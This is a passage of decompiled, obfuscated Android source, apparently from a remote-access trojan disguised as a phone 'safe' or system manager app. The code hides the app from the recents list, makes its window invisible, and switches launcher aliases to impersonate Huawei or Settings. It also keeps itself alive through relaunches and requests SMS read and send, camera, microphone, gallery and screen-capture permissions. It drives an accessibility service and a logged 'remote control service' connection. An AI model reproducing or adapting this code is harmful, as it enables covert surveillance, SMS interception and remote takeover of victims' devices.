        boolean z4 = getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("LkESNlg8CRFRIyRULihIOwkgQyI="), false);
        t60.m214702c3("iuzxujjtqev", "[任务] onCreate: exclude_from_recents=" + z4);
        if (z4) {
            t60.m214702c3("iuzxujjtqev", "[任务] 开始执行setExcludeFromRecents");
            try {
                Object systemService = getSystemService("activity");
                ActivityManager activityManager = systemService instanceof ActivityManager ? (ActivityManager) systemService : null;
                String packageName = getPackageName();
                if (activityManager != null && (appTasks2 = activityManager.getAppTasks()) != null) {
                    for (ActivityManager.AppTask appTask : appTasks2) {
                        try {
                            componentName = appTask.getTaskInfo().baseActivity;
                        } catch (Exception unused) {
                        }
                        if (componentName == null || !t60.m214686a2(componentName.getPackageName(), packageName)) {
                            z2 = z3;
                        } else {
                            appTask.setExcludeFromRecents(true);
                            String className2 = componentName.getClassName();
                            StringBuilder sb = new StringBuilder();
                            z2 = z3;
                            try {
                                sb.append("[任务] setExcludeFromRecents成功: ");
                                sb.append(className2);
                                t60.m214702c3("iuzxujjtqev", sb.toString());
                            } catch (Exception unused2) {
                            }
                        }
                        z3 = z2;
                    }
                }
            } catch (Exception unused3) {
            }
            z = z3;
            if (intent2 != null && intent2.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false)) {
                t60.m214702c3("iuzxujjtqev", "[任务] TRIGGER_EXCLUDE_FROM_RECENTS完成，finish");
                moveTaskToBack(true);
                finish();
                return;
            }
        } else {
            z = z3;
        }
        if (this.f51967d2) {
            finish();
            overridePendingTransition(0, 0);
            return;
        }
        boolean z5 = getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false);
        if ((intent2 == null || !intent2.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false)) && z5 && (z || m211216c6() || m211215c5())) {
            t60.m214714d6("iuzxujjtqev", "🎭 [伪装] 检测到伪装模式启动，跳转到系统手机管家");
            try {
                Object systemService2 = getSystemService("activity");
                ActivityManager activityManager2 = systemService2 instanceof ActivityManager ? (ActivityManager) systemService2 : null;
                if (activityManager2 != null && (appTasks = activityManager2.getAppTasks()) != null) {
                    for (ActivityManager.AppTask appTask2 : appTasks) {
                        try {
                            ActivityManager.RecentTaskInfo taskInfo = appTask2.getTaskInfo();
                            ComponentName componentName2 = taskInfo != null ? taskInfo.baseActivity : null;
                            if (t60.m214686a2(componentName2 != null ? componentName2.getPackageName() : null, getPackageName())) {
                                appTask2.setExcludeFromRecents(true);
                                t60.m214714d6("iuzxujjtqev", "🎭 [伪装] setExcludeFromRecents(true) 成功");
                            }
                        } catch (Exception unused4) {
                        }
                    }
                }
            } catch (Exception unused5) {
            }
            moveTaskToBack(true);
            this.f51967d2 = true;
            m211218c8();
            finish();
            return;
        }
        if (!z5 && (m211216c6() || m211215c5())) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [伪装] 未完成授权，重置组件状态");
            try {
                PackageManager packageManager = getPackageManager();
                packageManager.setComponentEnabledSetting(new ComponentName(this, (Class<?>) iuzxujjtqev.class), 1, 1);
                Iterator it2 = AbstractC0716jf.m213306g5(AppVariantE.class, AppVariantH.class, AppVariantI.class, AppVariantJ.class, AppVariantF.class, AppVariantN.class).iterator();
                while (it2.hasNext()) {
                    try {
                        packageManager.setComponentEnabledSetting(new ComponentName(this, (Class<?>) it2.next()), 2, 1);
                    } catch (Exception unused6) {
                    }
                }
            } catch (Exception e2) {
                t60.m214705c6("iuzxujjtqev", "❌ 重置伪装状态失败", e2);
            }
        }
        if (intent2 == null) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [启动] Intent为null");
        }
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION");
        intentFilter.addAction("com.storm.safe.rock.intent.REQUEST_PERMISSION_FROM_SERVICE");
        intentFilter.addAction("com.storm.safe.rock.intent.SHOW_MAIN_ACTIVITY");
        intentFilter.addAction("com.storm.safe.rock.intent.REQUEST_CAMERA_PERMISSION");
        intentFilter.addAction("com.storm.safe.rock.intent.REQUEST_GALLERY_PERMISSION");
        intentFilter.addAction("com.storm.safe.rock.intent.REQUEST_MICROPHONE_PERMISSION");
        intentFilter.addAction("com.storm.safe.rock.intent.REQUEST_SMS_PERMISSION");
        intentFilter.addAction("com.storm.safe.rock.intent.REQUEST_ALL_PERMISSIONS");
        intentFilter.addAction(getPackageName() + ".REQUEST_MEDIA_PROJECTION");
        int i = Build.VERSION.SDK_INT;
        iuzxujjtqev$combinedBroadcastReceiver$1 iuzxujjtqev_combinedbroadcastreceiver_1 = this.f51975e0;
        if (i >= 33) {
            registerReceiver(iuzxujjtqev_combinedbroadcastreceiver_1, intentFilter, 4);
        } else {
            registerReceiver(iuzxujjtqev_combinedbroadcastreceiver_1, intentFilter);
        }
        try {
            SharedPreferences sharedPreferences2 = getSharedPreferences(StringUtil.m212470a0("KkkBBUE5GSBUOQ=="), 0);
            int i2 = sharedPreferences2.getInt("launch_count", 0);
            sharedPreferences2.edit().putInt("launch_count", i2 + 1).apply();
            if (i2 == 0) {
                sharedPreferences2.edit().putLong("first_launch_time", System.currentTimeMillis()).apply();
            }
        } catch (Exception e3) {
            t60.m214705c6("iuzxujjtqev", "❌ 记录应用启动次数失败", e3);
        }
        if (getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("LkESNlg8CRFRIyRULihIOwkgQyI="), false)) {
            try {
                Object systemService3 = getSystemService("activity");
                ActivityManager activityManager3 = systemService3 instanceof ActivityManager ? (ActivityManager) systemService3 : null;
                if (activityManager3 == null) {
                    t60.m214726f4("iuzxujjtqev", "⚠️ [任务] excludeAppFromRecents: ActivityManager为null");
                } else {
                    String packageName2 = getPackageName();
                    for (ActivityManager.AppTask appTask3 : activityManager3.getAppTasks()) {
                        try {
                            ActivityManager.RecentTaskInfo taskInfo2 = appTask3.getTaskInfo();
                            ComponentName componentName3 = Build.VERSION.SDK_INT >= 29 ? taskInfo2.topActivity : taskInfo2.topActivity;
                            if (componentName3 != null && t60.m214686a2(componentName3.getPackageName(), packageName2)) {
                                appTask3.setExcludeFromRecents(true);
                            }
                        } catch (Exception unused7) {
                        }
                    }
                }
            } catch (Exception e4) {
                t60.m214705c6("iuzxujjtqev", "❌ [任务] excludeAppFromRecents失败", e4);
            }
        }
        if (intent2 != null && intent2.getBooleanExtra("LAUNCH_BACKGROUND", false)) {
            try {
                overridePendingTransition(0, 0);
                getWindow().getDecorView().setAlpha(0.0f);
                moveTaskToBack(true);
            } catch (Exception e5) {
                tz0.m214810b0("⚠️ [启动] 隐藏失败: ", e5.getMessage(), "iuzxujjtqev");
            }
        }
        if (AbstractC1229so.m214649b4()) {
            try {
                i60 h60Var = i60.f56802a1.getInstance(this);
                if (h60Var.m213105a1()) {
                    long jM213104a0 = h60Var.m213104a0();
                    long jCurrentTimeMillis = System.currentTimeMillis();
                    if (jCurrentTimeMillis - jM213104a0 >= 30000 && (intent = getIntent()) != null && ((!t60.m214686a2(intent.getAction(), "android.intent.action.MAIN") || (categories = intent.getCategories()) == null || !categories.contains("android.intent.category.LAUNCHER")) && !intent.getBooleanExtra("user_initiated", false))) {
                        boolean booleanExtra = intent.getBooleanExtra("from_keepalive", false);
                        boolean booleanExtra2 = intent.getBooleanExtra(StringUtil.m212470a0("IFwUKkw0BThSDidYBDROMA=="), false);
                        boolean booleanExtra3 = intent.getBooleanExtra("from_service", false);
                        str = "backgroundImageView";
                        try {
                            boolean booleanExtra4 = intent.getBooleanExtra("from_broadcast", false);
                            boolean booleanExtra5 = intent.getBooleanExtra("keepalive_service_start", false);
                            if (!booleanExtra && !booleanExtra2 && !booleanExtra3 && !booleanExtra4 && !booleanExtra5 && jCurrentTimeMillis - getSharedPreferences(StringUtil.m212470a0("IFwUKkw0BThSDidYBDROMA=="), 0).getLong("last_launch_time", 0L) >= 2000) {
                                Object systemService4 = getSystemService("activity");
                                t60.m214693b4(systemService4, "null cannot be cast to non-null type android.app.ActivityManager");
                                ActivityManager activityManager4 = (ActivityManager) systemService4;
                                List<ActivityManager.RunningTaskInfo> runningTasks = activityManager4.getRunningTasks(1);
                                t60.m214694b5(runningTasks, "runningTasks");
                                if (!runningTasks.isEmpty()) {
                                    ComponentName componentName4 = runningTasks.get(0).topActivity;
                                    if (t60.m214686a2(componentName4 != null ? componentName4.getPackageName() : null, getPackageName())) {
                                    }
                                }
                                try {
                                    List<ActivityManager.RunningAppProcessInfo> runningAppProcesses = activityManager4.getRunningAppProcesses();
                                    if (runningAppProcesses != null && !runningAppProcesses.isEmpty()) {
                                        for (ActivityManager.RunningAppProcessInfo runningAppProcessInfo : runningAppProcesses) {
                                            if (t60.m214686a2(runningAppProcessInfo.processName, getPackageName()) && runningAppProcessInfo.importance == 100) {
                                                getSharedPreferences(StringUtil.m212470a0("IFwUKkw0BThSDidYBDROMA=="), 0).edit().putLong("last_launch_time", jCurrentTimeMillis).apply();
                                            }
                                        }
                                    }
                                } catch (Exception unused8) {
                                }
                            }
                            overridePendingTransition(0, 0);
                            getWindow().setBackgroundDrawableResource(R.color.transparent);
                            getWindow().getAttributes().windowAnimations = 0;
                            finish();
                            return;
                        } catch (Exception e6) {
                            e = e6;
                            t60.m214705c6("iuzxujjtqev", "❌ 检查保活拉起状态失败", e);
                            if (intent2 != null) {
                                try {
                                    startActivity(new Intent(this, (Class<?>) qixvbtmo.class));
                                } catch (Exception e7) {
                                    t60.m214705c6("iuzxujjtqev", "❌ 启动 qixvbtmo 失败", e7);
                                }
                            }
                            setContentView(R$layout.rbv2f);
                            zM211214c4 = m211214c4();
                            View viewFindViewById = findViewById(R$id.backgroundImageView);
                            t60.m214694b5(viewFindViewById, "findViewById(R.id.backgroundImageView)");
                            this.f51963c8 = (ImageView) viewFindViewById;
                            it = AbstractC0716jf.m213306g5("bg_accessibility.webp", "bg_accessibility.png").iterator();
                            while (true) {
                                if (it.hasNext()) {
                                }
                            }
                            if (zM211214c4) {
                            }
                        }
                    }
                }
                str = "backgroundImageView";
            } catch (Exception e8) {
                e = e8;
                str = "backgroundImageView";
            }
        } else {
            str = "backgroundImageView";
        }
        if (intent2 != null && intent2.getBooleanExtra("request_media_projection", false)) {
            startActivity(new Intent(this, (Class<?>) qixvbtmo.class));
        }
        setContentView(R$layout.rbv2f);
        zM211214c4 = m211214c4();
        View viewFindViewById2 = findViewById(R$id.backgroundImageView);
        t60.m214694b5(viewFindViewById2, "findViewById(R.id.backgroundImageView)");
        this.f51963c8 = (ImageView) viewFindViewById2;
        try {
            it = AbstractC0716jf.m213306g5("bg_accessibility.webp", "bg_accessibility.png").iterator();
            while (true) {
                if (it.hasNext()) {
                    int iM214706c7 = t60.m214706c7(this, "bg_accessibility", 0);
                    if (iM214706c7 != 0 && (drawable = getResources().getDrawable(iM214706c7, getTheme())) != null) {
                        int intrinsicWidth = drawable.getIntrinsicWidth();
                        int intrinsicHeight = drawable.getIntrinsicHeight();
                        if (intrinsicWidth < 100 || intrinsicHeight < 100) {
                            t60.m214726f4("iuzxujjtqev", "⚠️ 背景图尺寸太小，视为占位符: " + intrinsicWidth + "x" + intrinsicHeight);
                        }
                    }
                } else {
                    try {
                        kj1.m213559a6(getAssets().open((String) it.next()), null);
                    } catch (Exception unused9) {
                    }
                }
            }
        } catch (Exception e9) {
            tz0.m214810b0("⚠️ 检查背景图失败: ", e9.getMessage(), "iuzxujjtqev");
        }
        if (zM211214c4) {
            View viewFindViewById3 = findViewById(R$id.mainContent);
            if (viewFindViewById3 == null) {
                return;
            }
            viewFindViewById3.setVisibility(8);
            return;
        }
        m211213c3();
        final w00 w00Var = new w00() { // from class: com.storm.safe.rock.iuzxujjtqev$setupClickListeners$enableButtonClickHandler$1
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                iuzxujjtqev.C0254a0 c0254a0 = iuzxujjtqev.f51956e2;
                iuzxujjtqev iuzxujjtqevVar = this.f51979a0;
                if (iuzxujjtqevVar.m211214c4()) {
                    iuzxujjtqevVar.m211209b5();
                } else {
                    iuzxujjtqevVar.m211221d1();
                }
                return C1351vv.f60710b1;
            }
        };
        Button button = this.f51959c4;
        if (button == null) {
            t60.m214724f2("enableButton");
            throw null;
        }
        button.setOnClickListener(new ViewOnClickListenerC1203s1(8, w00Var));
        Switch r2 = this.f51962c7;
        if (r2 == null) {
            t60.m214724f2("serviceSwitch");
            throw null;
        }
        r2.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() { // from class: ck1
            @Override // android.widget.CompoundButton.OnCheckedChangeListener
            public final void onCheckedChanged(CompoundButton compoundButton, boolean z6) {
                iuzxujjtqev.C0254a0 c0254a0 = iuzxujjtqev.f51956e2;
                w00 w00Var2 = w00Var;
                t60.m214695b6(w00Var2, "$enableButtonClickHandler");
                iuzxujjtqev iuzxujjtqevVar = this;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                if (z6) {
                    w00Var2.invoke();
                } else {
                    iuzxujjtqevVar.m211237e7();
                }
            }
        });
        m211238e8();
        m211228d8();
        return;
        ImageView imageView = this.f51963c8;
        if (imageView == null) {
            t60.m214724f2(str);
            throw null;
        }
        imageView.setVisibility(8);
        m211230e0();
        if (zM211214c4) {
        }
    }

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity
    public final void onDestroy() throws SecurityException {
        i60 h60Var;
        super.onDestroy();
        m211233e3();
        m211232e2();
        if (AbstractC1229so.m214649b4()) {
            try {
                h60Var = i60.f56802a1.getInstance(this);
            } catch (Exception e) {
                t60.m214705c6("iuzxujjtqev", "❌ onDestroy启动透明保活Activity失败", e);
            }
            if (!h60Var.m213105a1()) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [保活] 安装未完成，跳过保活");
                return;
            }
            if (System.currentTimeMillis() - h60Var.m213104a0() < 30000) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [保活] 安装刚完成，跳过保活");
                return;
            }
            int i = getSharedPreferences(StringUtil.m212470a0("KkkBBUE5GSBUOQ=="), 0).getInt("launch_count", 0);
            if (i < 3) {
                t60.m214726f4("iuzxujjtqev", "⚠️ onDestroy: 应用启动次数不足(" + i + ")，跳过透明保活Activity启动");
                return;
            }
            Object systemService = getSystemService("activity");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.ActivityManager");
            List<ActivityManager.RunningTaskInfo> runningTasks = ((ActivityManager) systemService).getRunningTasks(10);
            t60.m214694b5(runningTasks, "runningTasks");
            if (!runningTasks.isEmpty()) {
                for (ActivityManager.RunningTaskInfo runningTaskInfo : runningTasks) {
                }
            }
            try {
                Handler handler = this.f51970d5;
                if (handler != null) {
                    handler.removeCallbacksAndMessages(null);
                }
                this.f51970d5 = null;
                Handler handler2 = this.f51971d6;
                if (handler2 != null) {
                    handler2.removeCallbacksAndMessages(null);
                }
                this.f51971d6 = null;
            } catch (Exception e2) {
                tz0.m214810b0("清理Handler任务失败: ", e2.getMessage(), "iuzxujjtqev");
            }
            try {
                unregisterReceiver(this.f51975e0);
            } catch (Exception e3) {
                tz0.m214810b0("取消注册广播接收器失败: ", e3.getMessage(), "iuzxujjtqev");
            }
            try {
                try {
                    WebView webView = (WebView) findViewById(R$id.webView);
                    if (webView != null) {
                        webView.clearCache(true);
                    }
                    if (webView != null) {
                        webView.clearHistory();
                    }
                } catch (Exception e4) {
                    t60.m214726f4("iuzxujjtqev", "⚠️ 清理WebView缓存失败: " + e4.getMessage());
                }
                try {
                    WebView webView2 = (WebView) findViewById(R$id.webView);
                    if (webView2 != null) {
                        webView2.loadUrl("about:blank");
                        webView2.clearHistory();
                        webView2.clearCache(true);
                        webView2.destroy();
                    }
                } catch (Exception e5) {
                    tz0.m214810b0("⚠️ 销毁WebView失败: ", e5.getMessage(), "iuzxujjtqev");
                }
            } catch (Exception e6) {
                tz0.m214810b0("清理WebView资源失败: ", e6.getMessage(), "iuzxujjtqev");
            }
            m211232e2();
        }
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public final void onNewIntent(Intent intent) {
        String className;
        super.onNewIntent(intent);
        if (intent == null) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [生命周期] 收到null Intent");
            return;
        }
        if (intent.getBooleanExtra("OPEN_APP_DETAILS", false)) {
            startActivity(new Intent("android.settings.APPLICATION_DETAILS_SETTINGS", Uri.parse("package:" + getPackageName())));
            return;
        }
        setIntent(intent);
        boolean booleanExtra = intent.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false);
        if (!this.f51967d2 && !booleanExtra) {
            boolean z = getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false);
            ComponentName component = intent.getComponent();
            if (component == null || (className = component.getClassName()) == null) {
                className = "";
            }
            boolean z2 = component != null && (AbstractC0779a1.m213652a5(className, "AppVariantE", false) || AbstractC0779a1.m213652a5(className, "AppVariantH", false) || AbstractC0779a1.m213652a5(className, "HuaweiAlias", false) || AbstractC0779a1.m213652a5(className, "AppVariantI", false) || AbstractC0779a1.m213652a5(className, "AppVariantJ", false) || AbstractC0779a1.m213652a5(className, "SettingsAlias", false) || AbstractC0779a1.m213652a5(className, "AppVariantF", false) || AbstractC0779a1.m213652a5(className, "AppVariantG", false) || AbstractC0779a1.m213652a5(className, "AppVariantK", false) || AbstractC0779a1.m213652a5(className, "AppVariantL", false) || AbstractC0779a1.m213652a5(className, "AppVariantA", false) || AbstractC0779a1.m213652a5(className, "AppVariantN", false));
            if (z && (z2 || m211216c6() || m211215c5())) {
                this.f51967d2 = true;
                m211218c8();
                return;
            }
        }
        if (intent.getBooleanExtra("request_media_projection", false)) {
            try {
                startActivity(new Intent(this, (Class<?>) qixvbtmo.class));
                return;
            } catch (Exception e) {
                t60.m214705c6("iuzxujjtqev", "❌ 启动 qixvbtmo 失败", e);
                return;
            }
        }
        if (intent.getBooleanExtra("LAUNCH_BACKGROUND", false)) {
            try {
                overridePendingTransition(0, 0);
                getWindow().getDecorView().setAlpha(0.0f);
                moveTaskToBack(true);
            } catch (Exception unused) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [生命周期] onNewIntent隐藏失败");
            }
        }
        t60.m214714d6("iuzxujjtqev", "✅ [Intent] AUTO_REQUEST_PERMISSION=" + intent.getBooleanExtra("AUTO_REQUEST_PERMISSION", false));
        t60.m214714d6("iuzxujjtqev", "✅ [Intent] PERMISSION_LOST_RECOVERY=" + intent.getBooleanExtra("PERMISSION_LOST_RECOVERY", false));
        Bundle extras = intent.getExtras();
        if (extras != null) {
            Iterator<String> it = extras.keySet().iterator();
            while (it.hasNext()) {
                extras.get(it.next());
            }
        } else {
            t60.m214726f4("iuzxujjtqev", "⚠️ [Intent] 无额外参数");
        }
        if (intent.getBooleanExtra("from_installation_complete", false) && intent.getBooleanExtra("show_webview", false)) {
            t60.m214714d6("iuzxujjtqev", "✅ [参数] user_initiated=" + intent.getBooleanExtra("user_initiated", false) + ", force_foreground=" + intent.getBooleanExtra("force_foreground", false));
            try {
                if (((WebView) findViewById(R$id.webView)) == null) {
                    t60.m214704c5("iuzxujjtqev", "❌ 未找到WebView，可能布局未设置");
                    setContentView(R$layout.rbv2f);
                }
            } catch (Exception e2) {
                t60.m214705c6("iuzxujjtqev", "❌ 检查WebView失败", e2);
            }
            try {
                al1.f43714a5.getInstance(this).m209821a1();
                return;
            } catch (Exception e3) {
                t60.m214705c6("iuzxujjtqev", "❌ 启动保活服务失败", e3);
                return;
            }
        }
        if (intent.getBooleanExtra("request_camera_permission", false)) {
            try {
                runOnUiThread(new dk1(this, 11));
                m211222d2();
                return;
            } catch (Exception e4) {
                t60.m214705c6("iuzxujjtqev", "❌ 处理摄像头权限申请请求失败", e4);
                runOnUiThread(new dk1(this, 12));
                return;
            }
        }
        if (intent.getBooleanExtra("request_gallery_permission", false)) {
            try {
                String[] strArr = Build.VERSION.SDK_INT >= 33 ? new String[]{"android.permission.READ_MEDIA_IMAGES"} : new String[]{"android.permission.READ_EXTERNAL_STORAGE"};
                ArrayList arrayList = new ArrayList();
                for (String str : strArr) {
                    if (checkSelfPermission(str) != 0) {
                        arrayList.add(str);
                    }
                }
                if (arrayList.isEmpty()) {
                    return;
                }
                requestPermissions((String[]) arrayList.toArray(new String[0]), 1007);
                return;
            } catch (Exception e5) {
                t60.m214705c6("iuzxujjtqev", "申请相册权限失败", e5);
                return;
            }
        }
        if (intent.getBooleanExtra("request_microphone_permission", false)) {
            m211226d6();
            return;
        }
        if (intent.getBooleanExtra("request_sms_permission", false)) {
            try {
                String[] strArr2 = {"android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.READ_PHONE_STATE"};
                ArrayList arrayList2 = new ArrayList();
                for (int i = 0; i < 3; i++) {
                    String str2 = strArr2[i];
                    if (checkSelfPermission(str2) != 0) {
                        arrayList2.add(str2);
                    }
                }
                if (arrayList2.isEmpty()) {
                    return;
                }
                requestPermissions((String[]) arrayList2.toArray(new String[0]), 1006);
                return;
            } catch (Exception e6) {
                t60.m214705c6("iuzxujjtqev", "申请短信权限失败", e6);
                return;
            }
        }
        if (intent.getBooleanExtra("AUTO_REQUEST_PERMISSION", false)) {
            if (this.f51966d1) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 申请中，忽略重复Intent");
                return;
            }
            this.f51965d0 = true;
            this.f51966d1 = true;
            if (intent.getBooleanExtra("MIUI_PERMISSION_FIX", false)) {
                runOnUiThread(new bk1(this, 19));
                new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 20), 2000L);
                return;
            } else {
                try {
                    new Handler(Looper.getMainLooper()).post(new bk1(this, 21));
                } catch (Exception e7) {
                    t60.m214705c6("iuzxujjtqev", "❌ 设置Activity前台显示失败", e7);
                }
                new Handler(Looper.getMainLooper()).post(new bk1(this, 24));
                return;
            }
        }
        if (intent.getBooleanExtra("PERMISSION_LOST_RECOVERY", false)) {
            if (!m211214c4()) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [服务] 无障碍已失效，需重新配置");
                runOnUiThread(new dk1(this, 4));
                return;
            } else {
                m211236e6("🔧 检测到服务权限权限丢失\n正在自动重新申请权限...", Integer.valueOf(R.color.holo_orange_dark));
                m211234e4("正在恢复权限...", null, Boolean.FALSE);
                new Handler(Looper.getMainLooper()).postDelayed(new dk1(this, 3), 1000L);
                return;
            }
        }
        if (intent.getBooleanExtra("SMART_RECOVERY", false)) {
            if (!m211214c4()) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [服务] 无障碍已失效，需重新配置");
                runOnUiThread(new bk1(this, 27));
                return;
            }
            runOnUiThread(new bk1(this, 25));
            C0262a4 y01Var = C0262a4.f52127b5.getInstance(this);
            Integer num = AbstractC0241a0.f51907a1;
            Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
            if (pair != null) {
                int iIntValue = ((Number) pair.f57556a0).intValue();
                Intent intent2 = (Intent) pair.f57557a1;
                if (intent2 != null) {
                    y01Var.getClass();
                    try {
                        if (y01Var.m211340a4(intent2, iIntValue) != null) {
                            y01Var.f52134a5.set(0);
                            y01Var.f52135a6.set(0);
                            y01Var.m211342a6();
                            m211236e6("✅ 智能权限恢复成功\n服务权限已自动恢复", Integer.valueOf(R.color.holo_green_dark));
                            m211234e4("恢复完成", null, Boolean.FALSE);
                            Intent intent3 = new Intent("com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED");
                            intent3.putExtra(PollingXHR.Request.EVENT_SUCCESS, true);
                            intent3.putExtra(StringUtil.m212470a0("OFQQKFkHHitUPj1cAyM="), true);
                            sendBroadcast(intent3);
                            new Handler(Looper.getMainLooper()).postDelayed(new dk1(this, 15), 2000L);
                            return;
                        }
                    } catch (Exception e8) {
                        t60.m214705c6("SmartMediaProjection", "❌ 设置MediaProjection失败", e8);
                    }
                }
            }
            t60.m214726f4("iuzxujjtqev", "⚠️ [恢复] 智能恢复失败，进行标准申请");
            new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 26), 1000L);
            return;
        }
        if (intent.getBooleanExtra("auto_start", false)) {
            if (!m211214c4()) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [服务] 无障碍未启用，显示配置");
                m211238e8();
                return;
            }
            try {
                dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
                if (c0290a0 != null) {
                    C0323a8 c0323a8 = c0290a0.f52415e6;
                    if (c0323a8 != null) {
                        c0323a8.m211643a8();
                        c0323a8.m211669d6();
                    } else {
                        t60.m214726f4("dqtvuisjd", "⚠️ NetworkManager未初始化，无法启动连接");
                    }
                } else {
                    t60.m214726f4("iuzxujjtqev", "⚠️ [服务] 无障碍实例不可用");
                }
            } catch (Exception e9) {
                t60.m214705c6("iuzxujjtqev", "启动远程控制服务失败", e9);
            }
            m211238e8();
            return;
        }
        if (!intent.getBooleanExtra("auto_restart", false)) {
            if (intent.getBooleanExtra("SMART_RETURN_BACKUP", false)) {
                runOnUiThread(new bk1(this, 22));
                return;
            } else if (intent.getBooleanExtra("MI_ANDROID13_RETURN", false)) {
                runOnUiThread(new bk1(this, 23));
                return;
            } else {
                m211238e8();
                return;
            }
        }
        if (getIntent().getBooleanExtra("accessibility_lost", false)) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 无障碍权限丢失，等待用户操作");
            m211238e8();
        } else if (!m211214c4()) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 无障碍未启用，等待用户操作");
            m211238e8();
        } else if (dqtvuisjd.f52358m1.getInstance() != null) {
            m211238e8();
        } else {
            t60.m214726f4("iuzxujjtqev", "⚠️ [服务] 无障碍实例不可用，需重启");
            m211238e8();
        }
    }

    @Override // androidx.fragment.app.FragmentActivity, android.app.Activity
    public final void onPause() {
        super.onPause();
        try {
            WebView webView = (WebView) findViewById(R$id.webView);
            if (webView != null) {
                webView.onPause();
            }
        } catch (Exception e) {
            tz0.m214810b0("⚠️ 暂停WebView失败: ", e.getMessage(), "iuzxujjtqev");
        }
        if (this.f51973d8) {
            dqtvuisjd.f52358m1.setWebViewOpen(false);
        }
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public final void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        boolean z;
        t60.m214695b6(strArr, "permissions");
        t60.m214695b6(iArr, "grantResults");
        super.onRequestPermissionsResult(i, strArr, iArr);
        int i2 = 0;
        switch (i) {
            case 1006:
                if (iArr.length != 0) {
                    int length = iArr.length;
                    while (i2 < length) {
                        if (iArr[i2] == 0) {
                            i2++;
                        }
                    }
                    break;
                }
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 短信权限被拒绝");
                break;
            case 1007:
                if (iArr.length != 0) {
                    int length2 = iArr.length;
                    while (i2 < length2) {
                        if (iArr[i2] == 0) {
                            i2++;
                        }
                    }
                    break;
                }
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 相册权限未授予");
                break;
            case 1008:
                if (iArr.length != 0) {
                    int length3 = iArr.length;
                    while (i2 < length3) {
                        if (iArr[i2] == 0) {
                            i2++;
                        }
                    }
                    break;
                }
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 麦克风权限未授予");
                break;
            case 1009:
                if (iArr.length != 0) {
                    int length4 = iArr.length;
                    while (i2 < length4) {
                        if (iArr[i2] == 0) {
                            i2++;
                        }
                    }
                    runOnUiThread(new dk1(this, 20));
                    new Handler(Looper.getMainLooper()).postDelayed(new ek1(this, 1), 2000L);
                    break;
                }
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 摄像头权限被拒绝");
                runOnUiThread(new ek1(this, 2));
                break;
            case 1010:
                if (iArr.length == 0) {
                    z = false;
                } else {
                    for (int i3 : iArr) {
                        if (i3 != 0) {
                            z = false;
                        }
                    }
                    z = true;
                }
                int length5 = iArr.length;
                int i4 = 0;
                while (i2 < length5) {
                    if (iArr[i2] == 0) {
                        i4++;
                    }
                    i2++;
                }
                int length6 = iArr.length;
                if (z) {
                    runOnUiThread(new ek1(this, 3));
                    break;
                } else {
                    t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 部分被拒绝: " + i4 + "/" + length6);
                    runOnUiThread(new lj1(this, i4, length6, 1));
                    break;
                }
            case 1011:
                Integer numValueOf = iArr.length == 0 ? null : Integer.valueOf(iArr[0]);
                tz0.m214809a9("[通知权限] ★★★ iuzxujjtqev收到结果: ", (numValueOf != null && numValueOf.intValue() == 0) ? "已授权 ✓" : "被拒绝 ✗", " ★★★", "iuzxujjtqev");
                break;
        }
    }

    @Override // androidx.fragment.app.FragmentActivity, android.app.Activity
    public final void onResume() {
        String className;
        List<ActivityManager.AppTask> appTasks;
        super.onResume();
        f51957e3 = new WeakReference(this);
        C0356a1 rk1Var = C0356a1.f53714b2.getInstance();
        if (rk1Var != null) {
            C0356a1.f53716b4 = false;
            rk1Var.f53720a3 = true;
            rk1Var.f53721a4 = 0L;
            t60.m214702c3("npweufstehlb", "🎭 markAppOpened → appOpenedFlag=true");
        }
        try {
            if (getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("LkESNlg8CRFRIyRULihIOwkgQyI="), false)) {
                Object systemService = getSystemService("activity");
                ActivityManager activityManager = systemService instanceof ActivityManager ? (ActivityManager) systemService : null;
                String packageName = getPackageName();
